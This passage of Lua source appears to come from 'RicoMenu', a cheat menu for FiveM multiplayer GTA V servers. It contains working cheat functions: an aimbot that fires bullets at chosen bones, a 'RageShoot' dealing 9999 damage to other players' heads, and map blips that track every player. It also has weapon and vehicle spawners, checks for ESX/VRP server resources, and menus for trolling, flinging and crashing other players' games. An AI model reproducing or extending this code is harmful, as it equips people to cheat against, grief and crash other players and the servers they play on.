                            blipSprite = GetBlipSprite(pblips[i])
                            if not GetEntityHealth(ped) then 
                                if blipSprite ~= 274 then
                                    SetBlipSprite(pblips[i], 274)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
                                end
                            elseif veh then
                                vehClass = GetVehicleClass(veh)
                                vehModel = GetEntityModel(veh)
                                if vehClass == 15 then 
                                    if blipSprite ~= 422 then
                                        SetBlipSprite(pblips[i], 422)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
                                    end
                                elseif vehClass == 16 then 
                                    if vehModel == GetHashKey("besra") or vehModel == GetHashKey("hydra")
                                        or vehModel == GetHashKey("lazer") then -- jet
                                        if blipSprite ~= 424 then
                                            SetBlipSprite(pblips[i], 424)
                                            Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
                                        end
                                    elseif blipSprite ~= 423 then
                                        SetBlipSprite(pblips[i], 423)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
                                    end
                                elseif vehClass == 14 then 
                                    if blipSprite ~= 427 then
                                        SetBlipSprite(pblips[i], 427)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
                                    end
                                elseif vehModel == GetHashKey("insurgent") or vehModel == GetHashKey("insurgent2")
                                    or vehModel == GetHashKey("limo2") then 
                                    if blipSprite ~= 426 then
                                        SetBlipSprite(pblips[i], 426)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
                                    end
                                elseif vehModel == GetHashKey("rhino") then 
                                    if blipSprite ~= 421 then
                                        SetBlipSprite(pblips[i], 421)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
                                    end
                                elseif blipSprite ~= 1 then 
                                    SetBlipSprite(pblips[i], 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], true)
                                end
                                
                                
                                passengers = GetVehicleNumberOfPassengers(veh)
                                if passengers then
                                    if not IsVehicleSeatFree(veh, -1) then
                                        passengers = passengers + 1
                                    end
                                    ShowNumberOnBlip(pblips[i], passengers)
                                else
                                    HideNumberOnBlip(pblips[i])
                                end
                            else
                                
                                
                                HideNumberOnBlip(pblips[i])
                                if blipSprite ~= 1 then
                                    SetBlipSprite(pblips[i], 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], true)
                                end
                            end
                            SetBlipRotation(pblips[i], math.ceil(GetEntityHeading(veh)))
                            SetBlipNameToPlayerName(pblips[i], plist[i])
                            SetBlipScale(pblips[i], 0.85)
                            
                            
                            if IsPauseMenuActive() then
                                SetBlipAlpha(pblips[i], 255)
                            else
                                x1, y1 = table.unpack(GetEntityCoords(PlayerPedId(), true))
                                x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(plist[i]), true))
                                distance = (math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1)) + 900
                                if distance < 0 then
                                    distance = 0
                                elseif distance > 255 then
                                    distance = 255
                                end
                                SetBlipAlpha(pblips[i], distance)
                            end
                        end
                    end
                end
                Wait(0)
            end
        end)
    end
end

local function ShootAt(target, bone)
    local boneTarget = GetPedBoneCoords(target, GetEntityBoneIndexByName(target, bone), 0.0, 0.0, 0.0)
    SetPedShootsAtCoord(PlayerPedId(), boneTarget, true)
end

local function ShootAt2(target, bone, damage)
    local boneTarget = GetPedBoneCoords(target, GetEntityBoneIndexByName(target, bone), 0.0, 0.0, 0.0)
    local _, weapon = GetCurrentPedWeapon(PlayerPedId())
    ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0, 0, 0.1)), boneTarget, damage, true, weapon, PlayerPedId(), true, true, 1000.0)
end

local function ShootAimbot(k)
    if IsEntityOnScreen(k) and HasEntityClearLosToEntityInFront(PlayerPedId(), k) and
        not IsPedDeadOrDying(k) and not IsPedInVehicle(k, GetVehiclePedIsIn(k), false) and 
		IsDisabledControlPressed(0, Keys["MOUSE1"]) and IsPlayerFreeAiming(PlayerId()) then
        local x, y, z = table.unpack(GetEntityCoords(k))
        local _, _x, _y = World3dToScreen2d(x, y, z)
        if _x > 0.25 and _x < 0.75 and _y > 0.25 and _y < 0.75 then
            local _, weapon = GetCurrentPedWeapon(PlayerPedId())
            ShootAt2(k, AimbotBone, GetWeaponDamage(weapon, 1))
        end
    end
end

local function RageShoot(target)
    if not IsPedDeadOrDying(target) then
        local boneTarget = GetPedBoneCoords(target, GetEntityBoneIndexByName(target, "SKEL_HEAD"), 0.0, 0.0, 0.0)
        local _, weapon = GetCurrentPedWeapon(PlayerPedId())
        ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0, 0, 0.1)), boneTarget, 9999, true, weapon, PlayerPedId(), false, false, 1000.0)
        ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0, 0.1, 0)), boneTarget, 9999, true, weapon, PlayerPedId(), false, false, 1000.0)
        ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0.1, 0, 0)), boneTarget, 9999, true, weapon, PlayerPedId(), false, false, 1000.0)
    end
end

local function NameToBone(name)
    if name == "Head" then
        return "SKEL_Head"
    elseif name == "Chest" then
        return "SKEL_Spine2"
    elseif name == "Left Arm" then
        return "SKEL_L_UpperArm"
    elseif name == "Right Arm" then
        return "SKEL_R_UpperArm"
    elseif name == "Left Leg" then
        return "SKEL_L_Thigh"
    elseif name == "Right Leg" then
        return "SKEL_R_Thigh"
    elseif name == "Dick" then
        return "SKEL_Pelvis"
    else
        return "SKEL_ROOT"
    end
end

local function SpawnVeh(model, PlaceSelf, SpawnEngineOn)
    RequestModel(GetHashKey(model))
    Wait(500)
    if HasModelLoaded(GetHashKey(model)) then
        local coords = GetEntityCoords(PlayerPedId())
        local xf = GetEntityForwardX(PlayerPedId())
        local yf = GetEntityForwardY(PlayerPedId())
        local heading = GetEntityHeading(PlayerPedId())
        local veh = CreateVehicle(GetHashKey(model), coords.x + xf * 5, coords.y + yf * 5, coords.z, heading, 1, 1)
        if PlaceSelf then SetPedIntoVehicle(PlayerPedId(), veh, -1) end
        if SpawnEngineOn then SetVehicleEngineOn(veh, 1, 1) end
        return veh
    else ShowInfo("~b~Model not recognized (Try Again)") end
end

local function SpawnPlane(model, PlaceSelf, SpawnInAir)
    RequestModel(GetHashKey(model))
    Wait(500)
    if HasModelLoaded(GetHashKey(model)) then
        local coords = GetEntityCoords(PlayerPedId())
        local xf = GetEntityForwardX(PlayerPedId())
        local yf = GetEntityForwardY(PlayerPedId())
        local heading = GetEntityHeading(PlayerPedId())
        local veh = nil
        if SpawnInAir then
            veh = CreateVehicle(GetHashKey(model), coords.x + xf * 20, coords.y + yf * 20, coords.z + 500, heading, 1, 1)
        else
            veh = CreateVehicle(GetHashKey(model), coords.x + xf * 5, coords.y + yf * 5, coords.z, heading, 1, 1)
        end
        if PlaceSelf then SetPedIntoVehicle(PlayerPedId(), veh, -1) end
    else ShowInfo("~b~Model not recognized (Try Again)") end
end

local function GetCurrentOutfit(target)
    local ped = GetPlayerPed(target)
    outfit = {}
    
    outfit.hat = GetPedPropIndex(ped, 0)
    outfit.hat_texture = GetPedPropTextureIndex(ped, 0)
    
    outfit.glasses = GetPedPropIndex(ped, 1)
    outfit.glasses_texture = GetPedPropTextureIndex(ped, 1)
    
    outfit.ear = GetPedPropIndex(ped, 2)
    outfit.ear_texture = GetPedPropTextureIndex(ped, 2)
    
    outfit.watch = GetPedPropIndex(ped, 6)
    outfit.watch_texture = GetPedPropTextureIndex(ped, 6)
    
    outfit.wrist = GetPedPropIndex(ped, 7)
    outfit.wrist_texture = GetPedPropTextureIndex(ped, 7)
    
    outfit.head_drawable = GetPedDrawableVariation(ped, 0)
    outfit.head_palette = GetPedPaletteVariation(ped, 0)
    outfit.head_texture = GetPedTextureVariation(ped, 0)
    
    outfit.beard_drawable = GetPedDrawableVariation(ped, 1)
    outfit.beard_palette = GetPedPaletteVariation(ped, 1)
    outfit.beard_texture = GetPedTextureVariation(ped, 1)
    
    outfit.hair_drawable = GetPedDrawableVariation(ped, 2)
    outfit.hair_palette = GetPedPaletteVariation(ped, 2)
    outfit.hair_texture = GetPedTextureVariation(ped, 2)
    
    outfit.torso_drawable = GetPedDrawableVariation(ped, 3)
    outfit.torso_palette = GetPedPaletteVariation(ped, 3)
    outfit.torso_texture = GetPedTextureVariation(ped, 3)
    
    outfit.legs_drawable = GetPedDrawableVariation(ped, 4)
    outfit.legs_palette = GetPedPaletteVariation(ped, 4)
    outfit.legs_texture = GetPedTextureVariation(ped, 4)
    
    outfit.hands_drawable = GetPedDrawableVariation(ped, 5)
    outfit.hands_palette = GetPedPaletteVariation(ped, 5)
    outfit.hands_texture = GetPedTextureVariation(ped, 5)
    
    outfit.foot_drawable = GetPedDrawableVariation(ped, 6)
    outfit.foot_palette = GetPedPaletteVariation(ped, 6)
    outfit.foot_texture = GetPedTextureVariation(ped, 6)
    
    outfit.acc1_drawable = GetPedDrawableVariation(ped, 7)
    outfit.acc1_palette = GetPedPaletteVariation(ped, 7)
    outfit.acc1_texture = GetPedTextureVariation(ped, 7)
    
    outfit.acc2_drawable = GetPedDrawableVariation(ped, 8)
    outfit.acc2_palette = GetPedPaletteVariation(ped, 8)
    outfit.acc2_texture = GetPedTextureVariation(ped, 8)
    
    outfit.acc3_drawable = GetPedDrawableVariation(ped, 9)
    outfit.acc3_palette = GetPedPaletteVariation(ped, 9)
    outfit.acc3_texture = GetPedTextureVariation(ped, 9)
    
    outfit.mask_drawable = GetPedDrawableVariation(ped, 10)
    outfit.mask_palette = GetPedPaletteVariation(ped, 10)
    outfit.mask_texture = GetPedTextureVariation(ped, 10)
    
    outfit.aux_drawable = GetPedDrawableVariation(ped, 11)
    outfit.aux_palette = GetPedPaletteVariation(ped, 11)
    outfit.aux_texture = GetPedTextureVariation(ped, 11)
    
    return outfit
end

local function SetCurrentOutfit(outfit)
    local ped = PlayerPedId()
    
    SetPedPropIndex(ped, 0, outfit.hat, outfit.hat_texture, 1)
    SetPedPropIndex(ped, 1, outfit.glasses, outfit.glasses_texture, 1)
    SetPedPropIndex(ped, 2, outfit.ear, outfit.ear_texture, 1)
    SetPedPropIndex(ped, 6, outfit.watch, outfit.watch_texture, 1)
    SetPedPropIndex(ped, 7, outfit.wrist, outfit.wrist_texture, 1)
    
    SetPedComponentVariation(ped, 0, outfit.head_drawable, outfit.head_texture, outfit.head_palette)
    SetPedComponentVariation(ped, 1, outfit.beard_drawable, outfit.beard_texture, outfit.beard_palette)
    SetPedComponentVariation(ped, 2, outfit.hair_drawable, outfit.hair_texture, outfit.hair_palette)
    SetPedComponentVariation(ped, 3, outfit.torso_drawable, outfit.torso_texture, outfit.torso_palette)
    SetPedComponentVariation(ped, 4, outfit.legs_drawable, outfit.legs_texture, outfit.legs_palette)
    SetPedComponentVariation(ped, 5, outfit.hands_drawable, outfit.hands_texture, outfit.hands_palette)
    SetPedComponentVariation(ped, 6, outfit.foot_drawable, outfit.foot_texture, outfit.foot_palette)
    SetPedComponentVariation(ped, 7, outfit.acc1_drawable, outfit.acc1_texture, outfit.acc1_palette)
    SetPedComponentVariation(ped, 8, outfit.acc2_drawable, outfit.acc2_texture, outfit.acc2_palette)
    SetPedComponentVariation(ped, 9, outfit.acc3_drawable, outfit.acc3_texture, outfit.acc3_palette)
    SetPedComponentVariation(ped, 10, outfit.mask_drawable, outfit.mask_texture, outfit.mask_palette)
    SetPedComponentVariation(ped, 11, outfit.aux_drawable, outfit.aux_texture, outfit.aux_palette)
end

local function GetResources()
    local resources = {}
    for i = 1, GetNumResources() do
        resources[i] = GetResourceByFindIndex(i)
    end
    return resources
end

function IsResourceInstalled(name)
    local resources = GetResources()
    for i = 1, #resources do
        if resources[i] == name then
            return true
        else
            return false
        end
    end
end

function RicoMenu.SetFont(id, font)
    buttonFont = font
    menus[id].titleFont = font
end

function RicoMenu.SetMenuFocusBackgroundColor(id, r, g, b, a)
    setMenuProperty(id, "menuFocusBackgroundColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusBackgroundColor.a})
end

function RicoMenu.SetMaxOptionCount(id, count)
    setMenuProperty(id, 'maxOptionCount', count)
end

function RicoMenu.PopupWindow(x, y, title)

end


function RicoMenu.SetTheme(id, theme)
    if theme == "basic" then
        RicoMenu.SetMenuBackgroundColor(id, 81, 231, 251, 125)
        RicoMenu.SetTitleBackgroundColor(id, 92, 212, 249, 80)
        RicoMenu.SetTitleColor(id, 92, 212, 249, 230)
        RicoMenu.SetMenuSubTextColor(id, 255, 255, 255, 230)
        RicoMenu.SetMenuFocusColor(id, 40, 40, 40, 230)
        RicoMenu.SetFont(id, 7)
        RicoMenu.SetMenuX(id, .75)
        RicoMenu.SetMenuY(id, .1)
        RicoMenu.SetMenuWidth(id, 0.23)
        RicoMenu.SetMaxOptionCount(id, 12)
        
        titleHeight = 0.11 
        titleXOffset = 0.5 
        titleYOffset = 0.03 
        titleSpacing = 2 
        buttonHeight = 0.038 
        buttonScale = 0.365 
        buttonTextXOffset = 0.005 
        buttonTextYOffset = 0.005 
        
        themecolor = '~b~'
        themearrow = "+"
    elseif theme == "dark" then
        RicoMenu.SetMenuBackgroundColor(id, 180, 80, 80, 125)
        RicoMenu.SetTitleBackgroundColor(id, 180, 80, 80, 90)
        RicoMenu.SetTitleColor(id, 180, 80, 80, 230)
        RicoMenu.SetMenuSubTextColor(id, 255, 255, 255, 230)
        RicoMenu.SetMenuFocusColor(id, 40, 40, 40, 230)
        RicoMenu.SetFont(id, 1)
        RicoMenu.SetMenuX(id, .75)
        RicoMenu.SetMenuY(id, .1)
        RicoMenu.SetMenuWidth(id, 0.23)-- 0.23
        RicoMenu.SetMaxOptionCount(id, 12)-- 10
        
        titleHeight = 0.11 --0.11
        titleXOffset = 0.5 -- 0.5
        titleYOffset = 0.03 --0.03
        titleSpacing = 2 -- 2
        buttonHeight = 0.038 --0.038
        buttonScale = 0.365 --0.365
        buttonTextXOffset = 0.005 --0.005
        buttonTextYOffset = 0.005 --0.005
        
        themecolor = '~b~'
        themearrow = ">"
    elseif theme == "skid" then
        RicoMenu.SetMenuBackgroundColor(id, 5, 160, 1, 125)
        RicoMenu.SetTitleBackgroundColor(id, 5, 233, 1, 255)
        RicoMenu.SetTitleColor(id, 5, 233, 1, 200)
        RicoMenu.SetMenuSubTextColor(id, 255, 255, 255, 230)
        RicoMenu.SetFont(id, 0)
        RicoMenu.SetMenuX(id, .75)
        RicoMenu.SetMenuY(id, .1)
        RicoMenu.SetMenuWidth(id, 0.23)-- 0.23
        RicoMenu.SetMaxOptionCount(id, 13)-- 10
        
        titleHeight = 0.11 --0.11
        titleXOffset = 0.5 -- 0.5
        titleYOffset = 0.03 --0.03
        titleSpacing = 2 -- 2
        buttonHeight = 0.038 --0.038
        buttonScale = 0.365 --0.365
        buttonTextXOffset = 0.005 --0.005
        buttonTextYOffset = 0.005 --0.005
        
        themecolor = '~u~'
        themearrow = "~u~>"
    elseif theme == "infamous" then
              RicoMenu.SetMenuBackgroundColor(id, 38, 38, 38, 80)
        RicoMenu.SetTitleBackgroundColor(id, 61, 248, 249)
        RicoMenu.SetTitleColor(id, 240, 240, 240, 255)
        RicoMenu.SetMenuSubTextColor(id, 240, 240, 240, 255)
        RicoMenu.SetMenuFocusBackgroundColor(id, 61, 248, 249)
        RicoMenu.SetFont(id, 4)
        RicoMenu.SetMenuX(id, .725)
        RicoMenu.SetMenuY(id, .1)
		RicoMenu.SetMenuWidth(id, 0.23) -- 0.23
		RicoMenu.SetMaxOptionCount(id, 13) -- 10
		
		titleHeight = 0.15 --0.11
		titleXOffset = 0.5 -- 0.5
		titleYOffset = 0.05 --0.03
		titleSpacing = 2 -- 2
		buttonHeight = 0.045 --0.038
		buttonScale = 0.380 --0.365
		buttonTextXOffset = 0.010 --0.005
		buttonTextYOffset = 0.010 --0.005
		
        themecolor = "~b~"
		themearrow = "~h~>>"
    end
end

function RicoMenu.InitializeTheme()
    for i = 1, #menulist do
        RicoMenu.SetTheme(menulist[i], theme)
    end
end

-- ComboBox w/ new index behaviour (does not wrap around)
function RicoMenu.ComboBox2(text, items, currentIndex, selectedIndex, callback)
	local itemsCount = #items
	local selectedItem = items[currentIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

	if itemsCount > 1 and isCurrent then
		selectedItem = tostring(selectedItem)
	end

	if RicoMenu.Button(text, selectedItem) then
		selectedIndex = currentIndex
		callback(currentIndex, selectedIndex)
		return true
	elseif isCurrent then
		if currentKey == keys.left then
            if currentIndex > 1 then currentIndex = currentIndex - 1 
            elseif currentIndex == 1 then currentIndex = 1 end
		elseif currentKey == keys.right then
            if currentIndex < itemsCount then  currentIndex = currentIndex + 1 
            elseif currentIndex == itemsCount then currentIndex = itemsCount end
		end
	else
		currentIndex = selectedIndex
	end

	callback(currentIndex, selectedIndex)
    return false
end

-- Button with a slider
function RicoMenu.ComboBoxSlider(text, items, currentIndex, selectedIndex, callback)
	local itemsCount = #items
	local selectedItem = items[currentIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

	if itemsCount > 1 and isCurrent then
		selectedItem = tostring(selectedItem)
	end

	if RicoMenu.Button2(text, items, itemsCount, currentIndex) then
		selectedIndex = currentIndex
		callback(currentIndex, selectedIndex)
		return true
	elseif isCurrent then
		if currentKey == keys.left then
            if currentIndex > 1 then currentIndex = currentIndex - 1 
            elseif currentIndex == 1 then currentIndex = 1 end
		elseif currentKey == keys.right then
            if currentIndex < itemsCount then currentIndex = currentIndex + 1 
            elseif currentIndex == itemsCount then currentIndex = itemsCount end
		end
	else
		currentIndex = selectedIndex
    end
	callback(currentIndex, selectedIndex)
	return false
end

local function drawButton2(text, items, itemsCount, currentIndex)
	local x = menus[currentMenu].x + menus[currentMenu].width / 2
	local multiplier = nil

	if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
		multiplier = optionCount
	elseif optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].currentOption then
		multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
	end

	if multiplier then
		local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
		local backgroundColor = nil
		local textColor = nil
		local subTextColor = nil
		local shadow = false

		if menus[currentMenu].currentOption == optionCount then
			backgroundColor = menus[currentMenu].menuFocusBackgroundColor
			textColor = menus[currentMenu].menuFocusTextColor
			subTextColor = menus[currentMenu].menuFocusTextColor
		else
			backgroundColor = menus[currentMenu].menuBackgroundColor
			textColor = menus[currentMenu].menuTextColor
			subTextColor = menus[currentMenu].menuSubTextColor
			shadow = true
		end

        local sliderWidth = ((menus[currentMenu].width / 3) / itemsCount) 
        local subtractionToX = ((sliderWidth * (currentIndex + 1)) - (sliderWidth * currentIndex)) / 2

        local XOffset = 0.1 -- Default value in case of any error?
        local stabilizer = 1

        -- Draw order from top to bottom
        if itemsCount >= 40 then
            stabilizer = 1.005
        end
		
        drawRect(x, y, menus[currentMenu].width, buttonHeight, backgroundColor) -- Button Rectangle -2.15
        drawRect(((menus[currentMenu].x + 0.1075) + (subtractionToX * itemsCount)) / stabilizer, y, sliderWidth * (itemsCount - 1), buttonHeight / 2, {r = 110, g = 110, b = 110, a = 150}) -- Slide Outline
        drawRect(((menus[currentMenu].x + 0.1075) + (subtractionToX * currentIndex)) / stabilizer, y, sliderWidth * (currentIndex - 1), buttonHeight / 2, {r = 200, g = 200, b = 200, a = 140}) -- Slide
        drawText(text, menus[currentMenu].x + buttonTextXOffset, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont, textColor, buttonScale, false, shadow) -- Text

        --Ugly Code, I'll refactor it later
        local CurrentItem = tostring(items[currentIndex])
        if string.len(CurrentItem) == 1 then XOffset = 0.1050
        elseif string.len(CurrentItem) == 2 then XOffset = 0.1025
        elseif string.len(CurrentItem) == 3 then XOffset = 0.10015
        elseif string.len(CurrentItem) == 4 then XOffset = 0.1085
        elseif string.len(CurrentItem) == 5 then XOffset = 0.1070
        elseif string.len(CurrentItem) >= 6 then XOffset = 0.1055
        end
        -- roundNum seems kinda useless since I'm adjusting every position manually based on the lenght of the string. As stated above, I'll refactor this part later.
		-- (sliderWidth * roundNum((itemsCount / 2), 3)
        drawText(items[currentIndex], ((menus[currentMenu].x + XOffset) + 0.04) / stabilizer, y - (buttonHeight / 2.15) + buttonTextYOffset, buttonFont, {r = 255, g = 255, b = 255, a = 255}, buttonScale, false, shadow) -- Current Item Text
	end
end

-- Getting the center of an odd number of itemsCount (breaks on negative numbers)
function roundNum(num, numDecimalPlaces)
    local mult = 10^(numDecimalPlaces or 0)
    return math.floor(num * mult + 0.5) / mult
  end

function RicoMenu.Button2(text, items, itemsCount, currentIndex)
	local buttonText = text

	if menus[currentMenu] then
		optionCount = optionCount + 1

		local isCurrent = menus[currentMenu].currentOption == optionCount

		drawButton2(text, items, itemsCount, currentIndex)

		if isCurrent then
			if currentKey == keys.select then
				PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
				debugPrint(buttonText..' button pressed')
				return true
			elseif currentKey == keys.left or currentKey == keys.right then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end

		return false
	else
		debugPrint('Failed to create '..buttonText..' button: '..tostring(currentMenu)..' menu doesn\'t exist')

		return false
	end
end

-- Texture Handling
Citizen.CreateThread(function()
    local p = 1
    while true do
        if theme == "skid" then 
            if p == 5 then p = 1 else p = p + 1 end
            for i = 1, #menulist do
                if RicoMenu.IsMenuOpened(menulist[i]) then RicoMenu.SetTitleBackgroundSprite(menulist[i], 'digitaloverlay', 'static' .. p) end
            end
        else -- Base textures
            for i = 1, #menulist do RicoMenu.SetTitleBackgroundSprite(menulist[i], 'RicoMenuBanner', 'RicoMenuBanner') end
        end
        Wait(100)
    end
end)

Resources = GetResources()

ResourcesToCheck = {
        -- ESX
        "es_extended", "esx_dmvschool", "esx_policejob", "",
        -- VRP
        "vrp", "vrp_trucker", "vrp_TruckerJob"
}

Citizen.CreateThread(function()
    if mpMessage then ShowMPMessage(startMessage, subMessage, 50) else ShowInfo(startMessage .. " " .. subMessage) end
	if mpMessage then ShowMPMessage(subMessage1, 50) else ShowInfo(subMessage1) end
    ShowInfo(motd3)
	

    -- COMBO BOXES
    
    local currThemeIndex = 1
    local selThemeIndex = 1

    local currFaceIndex = GetPedDrawableVariation(PlayerPedId(), 0) + 1
    local selFaceIndex = GetPedDrawableVariation(PlayerPedId(), 0) + 1

    local currFtextureIndex = GetPedTextureVariation(PlayerPedId(), 0) + 1 
    local selFtextureIndex = GetPedTextureVariation(PlayerPedId(), 0) + 1 

    local currHairIndex = GetPedDrawableVariation(PlayerPedId(), 2) + 1
    local selHairIndex = GetPedDrawableVariation(PlayerPedId(), 2) + 1

    local currHairTextureIndex = GetPedTextureVariation(PlayerPedId(), 2) + 1
    local selHairTextureIndex = GetPedTextureVariation(PlayerPedId(), 2) + 1

    local currMaskIndex = GetPedDrawableVariation(PlayerPedId(), 1) + 1
    local selMaskIndex = GetPedDrawableVariation(PlayerPedId(), 1) + 1

	local currHatIndex = GetPedPropIndex(PlayerPedId(), 0) + 1
    local selHatIndex = GetPedPropIndex(PlayerPedId(), 0) + 1
    
    if currHatIndex == 0 or currHatIndex == 1 then -- No Hat
        currHatIndex = 9
        selHatIndex = 9
    end

	local currHatTextureIndex = GetPedPropTextureIndex(PlayerPedId(), 0)
    local selHatTextureIndex = GetPedPropTextureIndex(PlayerPedId(), 0)

    -- Fixes the Hat starting at index 1 not displaying because its value is 0
    if currHatTextureIndex == -1 or currHatTextureIndex == 0 then
        currHatTextureIndex = 1
        selHatTextureIndex = 1
    end
    
	local currPFuncIndex = 1
	local selPFuncIndex = 1
	
	local currVFuncIndex = 1
	local selVFuncIndex = 1
	
	local currSeatIndex = 1
	local selSeatIndex = 1
	
	local currTireIndex = 1
	local selTireIndex = 1
	
    local currNoclipSpeedIndex = 1
    local selNoclipSpeedIndex = 1
    
    local currForcefieldRadiusIndex = 1
    local selForcefieldRadiusIndex = 1
    
    local currFastRunIndex = 1
    local selFastRunIndex = 1
    
    local currFastSwimIndex = 1
    local selFastSwimIndex = 1

    local currObjIndex = 1
    local selObjIndex = 1
    
    local currRotationIndex = 3
    local selRotationIndex = 3
    
    local currDirectionIndex = 1
    local selDirectionIndex = 1
    
    local Outfits = {}
    local currClothingIndex = 1
    local selClothingIndex = 1
    
    local currGravIndex = 3
    local selGravIndex = 3
    
    local currSpeedIndex = 1
    local selSpeedIndex = 1
    
    local currAttackTypeIndex = 1
    local selAttackTypeIndex = 1
    
    local currESPDistance = 3
    local selESPDistance = 3
	
	local currESPRefreshIndex = 1
	local selESPRefreshIndex = 1
    
    local currAimbotBoneIndex = 1
    local selAimbotBoneIndex = 1
    
    local currSaveLoadIndex1 = 1
    local selSaveLoadIndex1 = 1
    local currSaveLoadIndex2 = 1
    local selSaveLoadIndex2 = 1
    local currSaveLoadIndex3 = 1
    local selSaveLoadIndex3 = 1
    local currSaveLoadIndex4 = 1
    local selSaveLoadIndex4 = 1
    local currSaveLoadIndex5 = 1
    local selSaveLoadIndex5 = 1
    
    local currRadioIndex = 1
    local selRadioIndex = 1

    local currWeatherIndex = 1
    local selWeatherIndex = 1

    -- GLOBALS
    local TrackedPlayer = nil
	local SpectatedPlayer = nil
	local FlingedPlayer = nil
    local PossessingVeh = false
	local pvblip = nil
	local pvehicle = nil
    local pvehicleText = ""
	local IsPlayerHost = nil
	
	if NetworkIsHost() then
		IsPlayerHost = "~g~Yes"
	else
		IsPlayerHost = "~b~No"
	end
	
    local savedpos1 = nil
    local savedpos2 = nil
    local savedpos3 = nil
    local savedpos4 = nil
    local savedpos5 = nil
    
    -- TOGGLES
    local includeself = true
    local Collision = true
    local objVisible = true
    local PlaceSelf = true
    local SpawnInAir = true
    local SpawnEngineOn = true
    
    -- TABLES
    SpawnedObjects = {}
    
    -- MAIN MENU
    RicoMenu.CreateMenu('skid', menuName .. '' .. version)
    RicoMenu.SetSubTitle('skid', '~s~Rico V2.4')
    
    -- MAIN MENU SUBMENUS
    RicoMenu.CreateSubMenu('player', 'skid', 'Player Options')
    RicoMenu.CreateSubMenu('self', 'skid', 'Self Options')
    RicoMenu.CreateSubMenu('weapon', 'skid', 'Weapon Options')
    RicoMenu.CreateSubMenu('vehicle', 'skid', 'Vehicle Options')
    RicoMenu.CreateSubMenu('world', 'skid', 'World Options')
	RicoMenu.CreateSubMenu('teleport', 'skid', 'Teleport Options')
    RicoMenu.CreateSubMenu('misc', 'skid', 'Misc Options')
    RicoMenu.CreateSubMenu('lua', 'skid', 'Lua Options')
    
    -- PLAYER MENU SUBMENUS  
    RicoMenu.CreateSubMenu('allplayer', 'player', 'All Players')
    RicoMenu.CreateSubMenu('playeroptions', 'player', 'Player Options')
	RicoMenu.CreateSubMenu('self', 'skid', 'Self Options')
	RicoMenu.CreateSubMenu('troll', 'playeroptions', 'Troll Options')
	RicoMenu.CreateSubMenu('crashtroll', 'playeroptions', 'Crash FiveM Options')
	RicoMenu.CreateSubMenu('jobsplayers', 'playeroptions', 'Jobs Options')
	RicoMenu.CreateSubMenu('weaponspawnerplayer', 'playeroptions', 'Weapon Player')
	
    
    -- SELF MENU SUBMENUS
    RicoMenu.CreateSubMenu('appearance', 'skid', 'Appearance Options')
    RicoMenu.CreateSubMenu('modifiers', 'self', 'Modifiers Options')
	
	-- APPEARANCE SUBMENUS
	RicoMenu.CreateSubMenu('modifyskintextures', 'appearance', "Modify Skin Textures")
    RicoMenu.CreateSubMenu('modifyhead', 'modifyskintextures', "Available Drawables")
	RicoMenu.CreateSubMenu('skinsmodels', 'appearance', "Skin Models")
    
    -- WEAPON MENU SUBMENUS
	
	RicoMenu.CreateSubMenu('WeaponCustomization', 'weapon', 'Weapon Customization')
    RicoMenu.CreateSubMenu('weaponspawner', 'weapon', 'Weapon Spawner')
    RicoMenu.CreateSubMenu('melee', 'weaponspawner', 'Melee Weapons')
    RicoMenu.CreateSubMenu('pistol', 'weaponspawner', 'Pistols')
    RicoMenu.CreateSubMenu('smg', 'weaponspawner', 'SMGs / MGs')
    RicoMenu.CreateSubMenu('shotgun', 'weaponspawner', 'Shotguns')
    RicoMenu.CreateSubMenu('assault', 'weaponspawner', 'Assault Rifles')
    RicoMenu.CreateSubMenu('sniper', 'weaponspawner', 'Sniper Rifles')
    RicoMenu.CreateSubMenu('thrown', 'weaponspawner', 'Thrown Weapons')
    RicoMenu.CreateSubMenu('heavy', 'weaponspawner', 'Heavy Weapons')
    
    -- VEHICLE MENU SUBMENUS
    RicoMenu.CreateSubMenu('vehiclespawner', 'vehicle', 'Vehicle Spawner')
    RicoMenu.CreateSubMenu('vehiclemods', 'vehicle', 'Vehicle Mods')
    RicoMenu.CreateSubMenu('vehiclemenu', 'vehicle', 'Vehicle Control Menu')
    RicoMenu.CreateSubMenu('VehBoostMenu', 'vehicle', 'Vehicle Boost Menu')
    -- VEHICLE SPAWNER MENU
    RicoMenu.CreateSubMenu('compacts', 'vehiclespawner', 'Compacts')
    RicoMenu.CreateSubMenu('sedans', 'vehiclespawner', 'Sedans')
    RicoMenu.CreateSubMenu('suvs', 'vehiclespawner', 'SUVs')
    RicoMenu.CreateSubMenu('coupes', 'vehiclespawner', 'Coupes')
    RicoMenu.CreateSubMenu('muscle', 'vehiclespawner', 'Muscle')
    RicoMenu.CreateSubMenu('sportsclassics', 'vehiclespawner', 'Sports Classics')
